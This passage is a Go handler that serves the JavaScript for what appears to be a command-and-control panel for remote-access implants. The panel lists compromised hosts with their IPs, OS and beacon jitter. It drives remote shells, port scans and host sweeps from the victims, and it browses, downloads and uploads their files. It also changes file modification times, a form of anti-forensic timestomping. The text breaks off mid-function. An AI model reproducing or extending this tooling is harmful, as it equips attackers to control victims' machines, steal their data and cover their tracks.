package web_ui
import (
	"net/http"
	"fmt"
)
func Js(error_str,web_route,web_js,web_css string, sessionSlice []string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		//必须先登录
		_, ok := CheckUserSession(r, sessionSlice, error_str)
        if !ok {
            w.WriteHeader(http.StatusNotFound)
            fmt.Fprint(w, error_str)
            return
        }
		if r.Method == http.MethodGet {
html := `
const TaskId = Math.random().toString(36).substring(2) + Date.now();

class index{
    constructor() {
      this.server = window.location.protocol + "//" + window.location.host;
      this.username = this.getCookie("cookie");
    }
    getCookie(name) {
        let cookies = document.cookie.split('; ');
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i];
            let cookieParts = cookie.split('=');
            if (cookieParts[0] === name) {
                return cookieParts[2];
            }
        }
        return null;
    }
      lainShell(){
        if (this.username){
            let interval_server=this.server+"/`+web_route+`?op=listen&username="+this.username;
            setInterval(function(){
                fetch(interval_server)
                .then(function(response){
                    return response.json(); // 解析为 JSON
                })
                .then(function(clients){
                    var div = document.getElementById('div_conn');
                    // 清空旧内容（使用 DOM 操作）
                    while (div.firstChild) {
                        div.removeChild(div.firstChild);
                    }

                    // clients 预期为数组 [{ uid, host, online_time, shell_ip }, ...]
                    for (var i = 0; i < clients.length; i++) {
                        var c = clients[i];

                        var container = document.createElement('div');
                        container.className = 'ip-container';
                        container.id = 'container-' + c.host;

                        var pUid = document.createElement('p');
                        pUid.className = 'ip-address';
                        pUid.id = c.uid;
                        pUid.textContent = '[Uid:' + c.uid + ']';

                        var pHost = document.createElement('p');
                        pHost.className = 'shell-address';
                        pHost.id = c.host;
                        pHost.textContent = '[Host:' + c.host + ']';

                        var pTime = document.createElement('p');
                        pTime.className = 'online-time';
                        pTime.textContent = '[online time:' + c.online_time + ']';

                        var pIP = document.createElement('p');
                        pIP.className = 'shell-address';
                        pIP.textContent = '[IP:' + c.shell_ip + ']';

                        var btnReceive = document.createElement('button');
                        btnReceive.className = 'let-it-in-button';
                        btnReceive.id = 'button_' + c.host;
                        btnReceive.textContent = 'receive';
                        // 用闭包保存当前 uid/host，避免循环引用问题
                        (function(uid, host){
                            btnReceive.onclick = function(){
                                // 调用你现有的函数 get_conn(uid, host)
                                get_conn(uid, host);
                            };
                        })(c.uid, c.host);

                        var btnRemove = document.createElement('button');
                        btnRemove.className = 'let-it-in-button';
                        btnRemove.textContent = 'remove';
                        (function(uid){
                            btnRemove.onclick = function(){
                                del_conn(uid);
                            };
                        })(c.uid);

                        // 组装
                        container.appendChild(pUid);
                        container.appendChild(pHost);
                        container.appendChild(pTime);
                        container.appendChild(pIP);
                        container.appendChild(btnReceive);
                        container.appendChild(btnRemove);

                        div.appendChild(container);
                    }
                })
                },3500)
            }
      }
      get(uid,shellname){
        let confirm1 = confirm('confirm?');
        if(confirm1){
            let key_url= this.server+"/`+web_route+`?op=insertKey&uid="+uid+"&username="+this.username+"&request="+shellname;
            fetch(key_url,{
                credentials: 'include' // 发送 cookie
            })
                return uid
            }
        }
        del(uid){
            let right = confirm('confirm?');
            let ms = confirm('ok');
            if (right && ms){
                document.getElementById("container-"+uid)?.remove();
                fetch(this.server+"/`+web_route+`?op=delIndex&uid="+uid)
                .then(response=>response.text())
                .then(data=>{
                })
            }
        }
      }
      
      class lain_terminal{
        constructor() {
            this.server = window.location.protocol + "//" + window.location.host;
            this.uid = "";
            this.username=this.getCookie("cookie");
            // this.results=document.getElementById('results').innerHTML;
            // document.getElementById('shellname').innerText=this.shellname;
            this.shell_dir = '';
            this.isMovingFile = false;
            this.move_file = this.move_file.bind(this);
            this.look_file = this.look_file.bind(this);
            this.intervalId = null;
            this.currentInput="";
            this.inputContainer="";
            this.inputKeydown = this.inputKeydown.bind(this);
        }

        init() {
            if (!this.uid) {
                console.log("uid is empty");
                return;
            }
            fetch(this.server + "/`+web_route+`?op=getCurrentDir&uid=" + this.uid)
                .then(response => response.text())
                .then(data => {
                    this.shell_dir = data;
                    console.log(this.shell_dir);
                });
        }

        getCookie(name) {
            let cookies = document.cookie.split('; ');
            for (let i = 0; i < cookies.length; i++) {
                let cookie = cookies[i];
                let cookieParts = cookie.split('=');
                if (cookieParts[0] === name) {
                    return cookieParts[2];
                }
            }
            return null;
        }      
        async lain_time() {
            if (this.uid) {
                let interval_server =this.server+"/`+web_route+`?op=getResults&uid="+this.uid+"&Taskid="+TaskId;
                let self = this;
                if (this.intervalId) {
                    clearInterval(this.intervalId);
                }
                return new Promise((resolve, reject) => {
                    this.intervalId = setInterval(async function () {
                        try {
                            let response = await fetch(interval_server, {
                                method: 'GET',
                            });
                            let data = await response.text();
                            if (data) {
                                const output = document.createElement('div');
                                output.contentEditable = true;
                                output.textContent = data;
                                output.className = 'output';
                                const inputContainer = terminal.querySelector('.input-container');
                                inputContainer.appendChild(output);
                                terminal.scrollTop = terminal.scrollHeight;
                                clearInterval(self.intervalId);
                                self.intervalId = null;
                                resolve(true);
                            }
                        } catch (error) {
                            console.error('Error:', error);
                            reject(false);
                        }
                    }, 1000);
                });
            } else {
                console.log('uid为空');
                return false;
            }
        }
        async get(command){
            if(command === "--help" && this.uid){
                const output = document.createElement('div');
                output.className = 'output';
                output.contentEditable = true;
                output.textContent = '--help: View help information\n' +
                    'scan: scan port(1-65535,scan [IP] [range(1,20,45...)or(1-65534)] [delay])\n' +
                    'sniff: scan host(sniff [net.range(1,20,45...)or(1-253)] [range(1,20,45...)or(1-65534)] [delay])\n';
                const inputContainer = terminal.querySelector('.input-container');
                inputContainer.appendChild(output);
                this.createInput();
            } else if (command.startsWith("scan") && this.uid) {
                this.sendjob('scan...'); // 创建新的提示符
                (async () => {
                    let target = command.split(" ")[1];
                    let port_list = command.split(" ")[2];
                    let sleep_time = command.split(" ")[3];
                    let powershell = "GET_PORTS^"+target+"^"+port_list+"^"+sleep_time+"^whatever";
                    let url = this.server+"/`+web_route+`?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell)+"&Taskid="+TaskId;
                    try {
                        await fetch(url,{
                            credentials: 'include' // 发送 cookie
                        });
                    } catch (error) {
                        console.error("Error fetching command:", error);
                    }
                })();
                let flag = await this.lain_time();
                if (flag) {
                    this.createInput();
                }
            } else if (command.startsWith("sniff") && this.uid) {
                this.sendjob('sniff...'); // 创建新的提示符
                (async () => {
                    let target = command.split(" ")[1];
                    let sniff_list = command.split(" ")[2];
                    let sleep_time = command.split(" ")[3];
                    let powershell = "GET_U_FRIENDS^"+target+"^"+sniff_list+"^"+sleep_time+"^whatever";
                    let url = this.server+"/`+web_route+`?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell)+"&Taskid="+TaskId;
                    try {
                        await fetch(url,{
                            credentials: 'include' // 发送 cookie
                        });
                        this.createInput();
                    } catch (error) {
                        console.error("Error fetching command:", error);
                    }
                })();
                let flag = await this.lain_time();
                if (flag) {
                    this.createInput();
                }
            }else if(this.uid){
                this.sendjob('agent'); // 创建新的提示符
                let url = this.server+"/`+web_route+`?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(command)+"&Taskid="+TaskId;
                await fetch(url,{
                    credentials: 'include' // 发送 cookie
                });
                let flag = await this.lain_time();
                if (flag) {
                    this.createInput();
                }
            }
        }
        async sendjob(str){
            const newPrompt = document.createElement('div');
            newPrompt.className = 'output';
            newPrompt.textContent = str+' SendMsg--->>';
            const terminal = document.getElementById("terminal");
            const inputContainer = terminal.querySelector(".input-container");
            inputContainer.appendChild(newPrompt);
        }
        createInput() {
            const newPrompt = document.createElement('div');
            newPrompt.className = 'output';
            newPrompt.textContent = 'Command>';
            const newInput = document.createElement('input');
            newInput.type = 'text';
            newInput.className = 'shell-input';
            newInput.addEventListener('keydown', this.inputKeydown);
            // 清空旧输入框（如果有）
            if (this.currentInput && this.currentInput.value !== undefined) {
                this.currentInput.value = '';
            }
            this.inputContainer.appendChild(newPrompt);
            this.inputContainer.appendChild(newInput);
            newInput.focus();
            this.currentInput = newInput;
        }
        async inputKeydown(event) {
            if (event.key === 'Enter') {
                event.preventDefault();
                const command = this.currentInput.value.trim();
                if (command) {
                    await this.get(command);
                    // 不需要再 await lain_time 和 createInput，这些已在 get 里处理
                }
            }
        }
        async loadFile(file_name,fileSize){
            if(fileSize && file_name){
                var splitSizeInput = document.getElementById('splitSize');
                var splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
                let file_key =  this.uid + "*" + file_name + "*" + splitSize
                var powershell = "LOAD_U_FILE^"+file_key;
                fetch(this.server+"/`+web_route+`?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell)+"&Taskid="+TaskId)
                .then(response => response.text())
                .then()
                return true;
            }
        }
        async getFile(path){
            if(path){
                var splitSizeInput = document.getElementById('splitSize');
                var splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
                var powershell = "GET_U_FILE^" + path + "^" + splitSize;
                fetch(this.server + "/`+web_route+`?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(powershell)+"&Taskid="+TaskId)
                .then(response => response.text())
                .then();
            }
        }
        renderFileList(fileContent, shell_dir = "") {
            const div_file = document.getElementById('file_resp');
            div_file.innerHTML = '';
            const dir_list = fileContent.split("\n");
            for (let i = 0; i < dir_list.length; i++) {
                let file = dir_list[i].trim();
                if (!file) continue;
                let new_file = document.createElement('div');
                new_file.classList.add('directory');
                let isDir = file.startsWith("dir ");
                let isFil = file.startsWith("fil ");
                let type = isDir ? "dir" : (isFil ? "fil" : null);
                if (!type) continue;
                let match = file.match(/^(\w+)\s+(.+?)<([^<>]+)><([^<>]+)>$/);
                let matchFile = file.match(/^(\w+)\s+(.+?)<([^<>]+)><([^<>]+)><([^<>]+)>$/);
                let name = "", size = "", perm = "", mtime = "";
                if (matchFile && type === "fil") {
                    name = matchFile[2];
                    size = matchFile[3];
                    perm = matchFile[4];
                    mtime = matchFile[5];
                } else if (match && type === "dir") {
                    name = match[2];
                    perm = match[3];
                    mtime = match[4];
                } else {
                    continue;
                }
                let full_path = shell_dir ? (shell_dir + "/" + name) : name;
                let renameBtn = "<button class='rename-btn' style='margin-left:5px;'>✏️</button>";
                let timeBtn = "<button class='time-btn' style='margin-left:5px;'>⏰</button>";
                if (type === "dir") {
                    new_file.classList.add('dir');
                    new_file.innerHTML =
                        '<span class="icon-dir">📁</span>' +
                        '<span class="filename">' + name + '</span>' +
                        '<span class="fileperm">&lt;' + perm + '&gt;</span>' +
                        '<span class="filetime">&lt;' + mtime + '&gt;</span>' +
                        renameBtn + timeBtn;
                    new_file.onclick = () => {
                        this.move_file(0, name);
                    };
                } else {
                    new_file.classList.add('file');
                    new_file.innerHTML =
                        '<span class="icon-file">📄</span>' +
                        '<span class="filename">' + name + '</span>' +
                        '<span class="filesize">&lt;' + size + '&gt;</span>' +
                        '<span class="fileperm">&lt;' + perm + '&gt;</span>' +
                        '<span class="filetime">&lt;' + mtime + '&gt;</span>' +
                        '<span class="icon-download" style="cursor:pointer;">⬇️</span>' +
                        renameBtn + timeBtn;
                    new_file.addEventListener('click', () => {
                        this.getFile(full_path);
                    });
                    new_file.querySelector('.icon-download')?.addEventListener('click', (e) => {
                        e.stopPropagation();
                        this.getFile(full_path);
                    });
                }
                new_file.querySelector('.rename-btn')?.addEventListener('click', (e) => {
                    e.stopPropagation();
                    const filenameSpan = new_file.querySelector('.filename');
                    const oldName = filenameSpan.innerText;
                    const newName = prompt("Enter the new name:", oldName);
                    if (newName && newName !== oldName) {
                        const cmd = "CHANG_FILE_NAME^" + full_path + "^" + newName;
                        fetch(this.server + "/`+web_route+`?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(cmd))+"&Taskid="+TaskId;
                        filenameSpan.innerText = newName;
                    }
                });
                new_file.querySelector('.time-btn')?.addEventListener('click', (e) => {
                    e.stopPropagation();
                    const newTime = prompt("Enter the new modified time (format: YYYY-MM-DD HH:mm:ss):");
                    if (newTime) {
                        const cmd = "CHANG_FILE_TIME^" + full_path + "^" + newTime;
                        fetch(this.server + "/`+web_route+`?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(cmd))+"&Taskid="+TaskId;
                        new_file.querySelector('.filetime').innerText = "<" + newTime + ">";
                    }
                });
                div_file.appendChild(new_file);
            }
        }
        async history_file() {
            if (this.uid) {
                const fileResponse = await fetch(this.server + "/`+web_route+`?op=readFileList&uid=" + this.uid);
                const result = await fileResponse.json();
                const historyParent = document.getElementById('history');
                if (historyParent) {
                    historyParent.innerHTML = '';
                    if (result && Array.isArray(result.data)) {
                        result.data.forEach((item, idx) => {
                            let listDiv = document.createElement('div');
                            listDiv.textContent = item.list;
                            listDiv.classList.add('history-item');
                            listDiv.style.cursor = 'pointer';
                            listDiv.style.display = 'flex';
                            listDiv.style.justifyContent = 'space-between';
                            listDiv.style.alignItems = 'center';
                            listDiv.onclick = () => {
                                if (item.file) {
                                    this.shell_dir = item.list;
                                    this.renderFileList(item.file, item.list);
                                }
                            };
                            let delBtn = document.createElement('span');
                            delBtn.textContent = '🗑️';
                            delBtn.title = 'delete';
                            delBtn.style.color = 'red';
                            delBtn.style.cursor = 'pointer';
                            delBtn.style.marginLeft = '8px';
                            delBtn.onclick = async (e) => {
                                e.stopPropagation();
                                const res = await fetch(this.server + "/`+web_route+`?op=delFileList&uid=" + this.uid + "&index=" + idx);
                                const r = await res.json();
                                if (r.code === "200") {
                                    listDiv.remove();
                                }
                            };
                            listDiv.appendChild(delBtn);
                            historyParent.appendChild(listDiv);
                        });
                    }
                }
            }
        }
        async look_file(dir) {
            if (this.uid && dir) {
                const powershell = "LOOK_UP_FILE^" + dir;
                try {
                    await fetch(this.server + "/`+web_route+`?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(powershell)+"&Taskid="+TaskId);
                    while (true) {
                        await new Promise(resolve => setTimeout(resolve, 5000));
                        const fileResponse = await fetch(this.server + "/`+web_route+`?op=getFileList&uid=" + this.uid+"&Taskid="+TaskId);
                        const data = await fileResponse.text();
                        if (data) {
                            this.renderFileList(data, this.shell_dir);
                            this.history_file()
                            return true;
                        } else if (data === "is empty") {
                            return false;
                        }
                    }
                } catch (error) {
                    console.error("Viewing directory failed:", error);
                    return false;
                }
            }
        }
         async move_file(num, cur_dir) {
            let cur_dir_p = document.getElementById("cur_dir_p");
            if (this.isMovingFile) {
                console.log("Don't move around....");
                return;
            }
            this.isMovingFile = true; // 锁定操作
            let temp_dir = this.shell_dir; // 保存当前路径
            try {
                if (this.uid) {
                    if (num === 1 && cur_dir === 'no') {
                        this.shell_dir += '/..'; // 返回上级目录
                    } else if (num === 0) {
                        // 解析目录路径
                        this.shell_dir += "/" + cur_dir ;
                    }
                    // 确保 look_file 异步执行
                    let flag = await this.look_file(this.shell_dir);
                    if (!flag) {
                        this.shell_dir = temp_dir; // 回退路径
                        alert("!Does not exist or has no permission to access this directory?");
                    }
                    console.log(this.shell_dir);
                }
            } catch (error) {
                console.error("An error occurred in move_file:", error);
            } finally {
                // 保证最终解锁
                cur_dir_p.textContent = "Path:\t" + this.shell_dir;
                this.isMovingFile = false;
            }
        }
        async move_dir(){
            let cur_dir_p = document.getElementById("cur_dir_p");
            let temp_dir = this.shell_dir;
            let directory = document.getElementById("directoryInput").value;
            this.shell_dir = directory;
            let flag = await this.look_file(this.shell_dir);
            if (!flag) {
                this.shell_dir = temp_dir; // 如果 look_file 返回 false，则回退目录
                console.log("!Does not exist or has no permission to access this directory?")
            }
            console.log(this.shell_dir);
            cur_dir_p.textContent="Path:\t"+this.shell_dir;
        }
        get_btn_move(){
            var btn = document.getElementById('dir-btn');
            btn.addEventListener('click', async () => {
                this.move_file(1,'no')
            })
        }

        switchVer(value){
            let cmd = "SWITCH_VERSION^"+value;
            fetch(this.server+"/`+web_route+`?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(cmd))+"&Taskid="+TaskId;
        }
    }
    
    //主页面类
    class lain_index{
        constructor() {
            this.server = window.location.protocol + "//" + window.location.host;
            this.username = this.getCookie("cookie");
            this.User_data = [];
            this.check_time = [];
            this.check_uid = [];
        }
        getCookie(name) {
            let cookies = document.cookie.split('; ');
            for (let i = 0; i < cookies.length; i++) {
                let cookie = cookies[i];
                let cookieParts = cookie.split('=');
                if (cookieParts[0] === name) {
                    return cookieParts[2];
                }
            }
            return null;
        }
        lain_shell() {
            if (this.username) {
                let container = document.getElementById('div_index');
                setInterval(() => {
                    let interval_server = this.server + "/`+web_route+`?op=userIndex&clientsCount=" + Object.keys(this.User_data).length;
                    fetch(interval_server)
                        .then(response => {
                            if (!response.ok && response.status === 400) {
                                return response.text(); 
                            }
                            if (response.ok) {
                                if (response.headers.get('Content-Type').includes('application/json')) {
                                    return response.json();
                                } else {
                                    return {};
                                }
                            } else {
                                return {};
                            }
                        })
                        .then(data => {
                            if (data === 'noNeeded') {
                                return;
                            } else if (Array.isArray(data) && data.length > 0) {
                                this.User_data = data;
                                net_init(this.User_data);
                                this.User_data.forEach(key => {
                                    let userDiv = document.getElementById(key['uid'] + "info");
                                    if (!userDiv) {
                                        userDiv = document.createElement('div');
                                        userDiv.classList.add('ip-info');
                                        userDiv.id = key['uid'] + "info";
                                        container.appendChild(userDiv);
                                    }

                                    let pluginButtons = ''; // 收集所有按钮 HTML
                                    let pluginParam = key['plugin_parameter'];
                                    let os = key['os'].toLowerCase(); // 加入 os 判断

                                    if (pluginParam && typeof pluginParam === 'object' && pluginParam[os]) {
                                        for (let codeword in pluginParam[os]) {
                                            let paramDescList = pluginParam[os][codeword];
                                            console.log('客户端', key['uid'], os + '插件：', codeword, paramDescList);
                                            let encodedDesc = encodeURIComponent((Array.isArray(paramDescList) ? paramDescList : []).join(','));
                                            let plugindiv = '<button class="console-link" onclick="showPluginDialog(\''
                                                + key['uid'] + '\', \'' + os + '\', \'' + encodedDesc + '\', \'' + codeword + '\')">[' + codeword + ']</button>';
                                            pluginButtons += plugindiv;
                                        }
                                    }

                                    let osEmoji = "💻";
                                    if (os.includes("linux")) {
                                        osEmoji = "🐧";
                                    } else if (os.includes("macos")) {
                                        osEmoji = "🍏";
                                    } else if (os.includes("android")) {
                                        osEmoji = "🤖";
                                    }

                                    let userHTML = '<div class="conn-container">' +
                                        '<span class="shell-address">' + key['external_ip'] + '/</span>' +
                                        '<span class="ip-address">' + key['host'] + '/</span>' +
                                        '<span class="ip-address">' + key['uid'] + '/</span>' +
                                        '<span class="ip-address">'+ osEmoji + '/' + key['os'] + '</span>' +
                                        '<div class="os-container">' +
                                            '<div class="ip-address" id="' + key['uid'] + '-img" style="background-color: #8B4513; width: 106px; height: 1px; display: inline-block; vertical-align: middle; position: relative;"><div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; box-shadow: inset 0 0 0 106px #8B4513;"></div></div>' +
                                        '</div>' +
                                    '</div>' +
                                    '<div class="button-container">' +
                                        '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'info\')">[info]</button>' +
                                        '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'choose\')">[☰]</button>' +
                                        '<button class="console-link" onclick="del(\'' + key['uid'] + '\')">🗑️</button>' +
                                    '</div>' +
                                    '<div class="info-content" id="' + key['uid'] + '-info-content">' +
                                        '<p><strong class="s_left">Remarks:</strong><input type="text" value="' + key['remarks'] + '" id="remarks_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                        '<p><strong class="s_left">Path:</strong><strong class="s_right">' + key['current_dir'] + '</strong></p>' +
                                        '<p><strong class="s_left">Host:</strong><strong class="s_right">' + key['host'] + '</strong></p>' +
                                        '<p><strong class="s_left">IP Addresses:</strong><strong class="s_right">' + key['local_ip'] + '</strong></p>' +
                                        '<p><strong class="s_left">Check:</strong><strong id="' + key['uid'] + '-check" class="s_right">' + key['check_time'] + '</strong></p>' +
                                        '<p><strong class="s_left">Executable:</strong><strong class="s_right">' + key['executable'] + '</strong></p>' +
                                        '<p><strong class="s_left">OS:</strong><strong class="s_right">' + key['os'] + '</strong></p>' +
                                        '<p><strong class="s_left">Delay:</strong><input type="text" value="' + key['delay'] + '" id="delay_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                        '<p><strong class="s_left">Jitter:</strong><input type="text" value="' + key['jitter'] + '" id="jitter_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                        '<p><strong class="s_left">UID:</strong><strong class="s_right">' + key['uid'] + '</strong></p>' +
                                        '<p><strong class="s_left">Server:</strong><strong class="s_right">' + key['server'] + '</strong></p>' +
                                        '<p><strong class="s_left">Username:</strong><input type="text" value="' + key['username'] + '" id="username_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                        '<button class="console-link" onclick="saveInfo(\'' + key['uid'] + '\')">Save Changes</button>' +
                                    '</div>' +
                                    '<div class="choose-content" id="' + key['uid'] + '-choose-content">' +
                                        '<button class="console-link" onclick="showTerminalDialog(\'' + key['uid'] + '\', \'' + key['host'] + '\', \'' + key['os'] + '\')">💻</button>' +
                                        '<button class="console-link" onclick="showFileDialog(\'' + key['uid'] + '\', \'' + key['host'] + '\')">🗂️</button>' +
                                        '<button class="console-link" onclick="showMsgDialog(\'' + key['uid'] + '\', \'' + key['host'] + '\')">📩</button>' +
                                        pluginButtons +
                                    '</div>' +
                                    '<div class="info-content" id="' + key['uid'] + '-msg-content"></div>';

                                    userDiv.innerHTML = userHTML;
                                });
                            } else if (Array.isArray(data) && data.length === 0) {
                                console.log("No data available, clearing container.");
                                container.innerHTML = '';
                            }
                        })
                        .catch(error => {
                            console.error("Error fetching data:", error);
                        });
                }, 5000);
            }
        }
        showTerminalDialog(uid, host, os) {
            let dialog = document.getElementById("terminal-dialog");
            if (!dialog) {
                dialog = document.createElement("div");
                dialog.id = "terminal-dialog";
                dialog.style.position = "fixed";
                dialog.style.top = "5%";
                dialog.style.left = "50%";
                dialog.style.transform = "translateX(-50%)";
                dialog.style.background = "#fff";
                dialog.style.zIndex = 9999;
                dialog.style.maxWidth = "900px";
                dialog.style.width = "90vw";
                dialog.style.maxHeight = "90vh";
                dialog.style.overflow = "auto";
                dialog.style.border = "1px solid #ccc";
                dialog.style.borderRadius = "8px";
                dialog.style.boxShadow = "0 2px 8px rgba(0,0,0,0.2)";
                dialog.style.padding = "16px";
                dialog.style.userSelect = "none";
                dialog.style.touchAction = "none";
                document.body.appendChild(dialog);
            } else {
                dialog.innerHTML = "";
            }

            // 拖动条和内容
            dialog.innerHTML =
                '<div id="terminal-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:32px;cursor:move;background:rgba(0,0,0,0.05);border-top-left-radius:8px;border-top-right-radius:8px;z-index:10001;"></div>' +
                '<button id="terminal-close-btn" type="button" style="position:absolute;right:10px;top:5px;z-index:10002;width:28px;height:28px;border-radius:50%;background:#f44336;color:#fff;border:none;display:flex;align-items:center;justify-content:center;font-size:18px;line-height:1;cursor:pointer;box-shadow:0 2px 6px rgba(0,0,0,0.08);transition:background 0.2s;" onmouseover="this.style.background=\'#d32f2f\'" onmouseout="this.style.background=\'#f44336\'">×</button>' +
                '<div class="shell-container" style="margin-top:32px;">' +
                "<label for='options' style='margin-right: 10px;'>Select Shell:</label>" +
                "<select id='os_options' name='options' style='margin-left: 10px;'></select>" +
                "<p id='hostname' style='margin-left: 10px; font-size: 10px;'>Host:" + host + "</p>" +
                '</div>' +
                '<div class="terminal" id="terminal">' +
                '<div class="input-container"></div>' +
                '</div>' +
                '<link rel="stylesheet" href="/`+web_css+`">';

            // 关闭按钮
            dialog.querySelector("#terminal-close-btn").onclick = function () {
                dialog.remove();
            };

            // 拖动逻辑（兼容PC和移动端，且窗口不能移出页面）
            const dragBar = dialog.querySelector("#terminal-drag-bar");
            let isDragging = false, offsetX = 0, offsetY = 0, startX = 0, startY = 0;

            function clamp(val, min, max) {
                return Math.max(min, Math.min(val, max));
            }

            function getDialogRect() {
                return dialog.getBoundingClientRect();
            }

            function onMove(e) {
                if (!isDragging) return;
                let clientX = e.touches ? e.touches[0].clientX : e.clientX;
                let clientY = e.touches ? e.touches[0].clientY : e.clientY;
                let newLeft = clientX - offsetX;
                let newTop = clientY - offsetY;
                // 限制窗口不移出页面
                const rect = getDialogRect();
                const winW = window.innerWidth, winH = window.innerHeight;
                const maxLeft = winW - rect.width;
                const maxTop = winH - rect.height;
                newLeft = clamp(newLeft, 0, maxLeft > 0 ? maxLeft : 0);
                newTop = clamp(newTop, 0, maxTop > 0 ? maxTop : 0);
                dialog.style.left = newLeft + "px";
                dialog.style.top = newTop + "px";
                dialog.style.transform = ""; // 拖动后取消居中
            }

            function stopMove() {
                isDragging = false;
                document.body.style.userSelect = "";
                document.removeEventListener("mousemove", onMove);
                document.removeEventListener("mouseup", stopMove);
                document.removeEventListener("touchmove", onMove);
                document.removeEventListener("touchend", stopMove);
            }

            dragBar.addEventListener("mousedown", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.clientX - rect.left;
                offsetY = e.clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("mousemove", onMove);
                document.addEventListener("mouseup", stopMove);
            });
            dragBar.addEventListener("touchstart", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.touches[0].clientX - rect.left;
                offsetY = e.touches[0].clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("touchmove", onMove, {passive: false});
                document.addEventListener("touchend", stopMove);
            });

            setTimeout(() => {
                // 初始化 shell 选项
                const optionsElement = document.getElementById("os_options");
                if (os == "win") {
                    optionsElement.innerHTML = "<option>Shell</option><option value='cmd'>cmd</option><option value='powershell'>powershell</option><option value='custom'>customize shell</option>";
                } else if (os == "linux" || os == "macos") {
                    optionsElement.innerHTML = "<option>Shell</option><option value='bash'>bash</option><option value='sh'>sh</option><option value='custom'>customize shell</option>";
                } else if (os == "android") {
                    optionsElement.innerHTML = "<option>Shell</option><option value='/system/bin/bash'>/system/bin/bash</option><option value='/system/bin/sh'>/system/bin/sh</option><option value='custom'>customize shell</option>";
                }

                // 创建 terminal 实例并初始化
                const terminal = new lain_terminal();
                terminal.uid = uid;
                terminal.init();

                // 让 terminal 内部管理输入框和事件
                terminal.inputContainer = document.querySelector("#terminal .input-container");
                terminal.createInput();

                // shell切换
                optionsElement.addEventListener("change", function () {
                    const selectedValue = this.value;
                    if (selectedValue === "custom") {
                        const customEnv = prompt("Enter a shell:");
                        if (customEnv) {
                            const newOption = document.createElement("option");
                            newOption.value = customEnv;
                            newOption.textContent = customEnv;
                            this.insertBefore(newOption, this.querySelector("option[value='custom']"));
                            this.value = customEnv;
                            terminal.switchVer(customEnv);
                        } else {
                            this.value = "Shell";
                        }
                    } else {
                        terminal.switchVer(selectedValue);
                    }
                });
            }, 200);
        }
        showFileDialog(uid, host) {
            // 检查是否已存在弹窗
            let dialog = document.getElementById("file-dialog");
            if (!dialog) {
                dialog = document.createElement("div");
                dialog.id = "file-dialog";
                dialog.style.position = "fixed";
                dialog.style.top = "5%";
                dialog.style.left = "50%";
                dialog.style.transform = "translateX(-50%)";
                dialog.style.background = "#fff";
                dialog.style.zIndex = 9999;
                dialog.style.maxWidth = "1100px";
                dialog.style.width = "95vw";
                dialog.style.maxHeight = "90vh";
                dialog.style.overflow = "hidden";
                dialog.style.border = "1px solid #ccc";
                dialog.style.borderRadius = "8px";
                dialog.style.boxShadow = "0 2px 8px rgba(0,0,0,0.2)";
                dialog.style.padding = "16px";
                dialog.style.userSelect = "none";
                dialog.style.touchAction = "none";
                document.body.appendChild(dialog);
            } else {
                dialog.innerHTML = "";
            }

            // 拖动条和内容
            dialog.innerHTML =
                '<div id="file-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:32px;cursor:move;background:rgba(0,0,0,0.05);border-top-left-radius:8px;border-top-right-radius:8px;z-index:10001;"></div>' +
                '<button id="file-close-btn" type="button" style="position:absolute;right:10px;top:5px;z-index:10002;width:28px;height:28px;border-radius:50%;background:#f44336;color:#fff;border:none;display:flex;align-items:center;justify-content:center;font-size:18px;line-height:1;cursor:pointer;box-shadow:0 2px 6px rgba(0,0,0,0.08);transition:background 0.2s;" onmouseover="this.style.background=\'#d32f2f\'" onmouseout="this.style.background=\'#f44336\'">x</button>' +
                '<div style="display:flex;width:100%;margin-top:32px;position:relative;height:calc(90vh - 48px);overflow:hidden;">' +
                    '<div id="history" class="file-history" style="width:200px;min-width:80px;max-width:80vw;transition:width 0.1s;"></div>' +
                    '<div id="file-history-resizer" style="min-width:6px;cursor:col-resize;background:#e0e0e0;z-index:10;"></div>' +
                    '<div class="filecontainer" style="flex:1;min-width:80px;overflow:auto;height:100%;">' +
                        '<div>' +
                            '<div style="display: flex; align-items: center;">' +
                                "<p id='hostname' style='margin-right: 25px;'>Host:" + host + "</p>" +
                                '<label for="splitSize">Enter the split size (each part in MB): </label>' +
                                '<input type="number" id="splitSize" min="1" placeholder="Enter part" />' +
                            '</div>' +
                        '</div>' +
                        '<div id="file_resp" class="file-manager"></div>' +
                        '<form id="uploadForm">' +
                            '<input type="file" id="uploadFile" name="uploadFile" required>' +
                            '<input class="fileinput" type="submit" value="Upload">' +
                        '</form>' +
                        '<div class="dir-btn" id="dir-btn">&#x21B6; ../</div>' +
                        '<div class="dir-controls">' +
                            '<p id="cur_dir_p"></p>' +
                            '<input type="text" id="directoryInput">' +
                            '<button id="moveDirButton" type="button">Goto folder</button>' +
                        '</div>' +
                    '</div>' +
                '</div>' +
                '<link rel="stylesheet" href="/`+web_css+`">';

            // 关闭按钮
            dialog.querySelector("#file-close-btn").onclick = function () {
                dialog.remove();
            };

            // 拖动逻辑（兼容PC和移动端，且窗口不能移出页面）
            const dragBar = dialog.querySelector("#file-drag-bar");
            let isDragging = false, offsetX = 0, offsetY = 0;

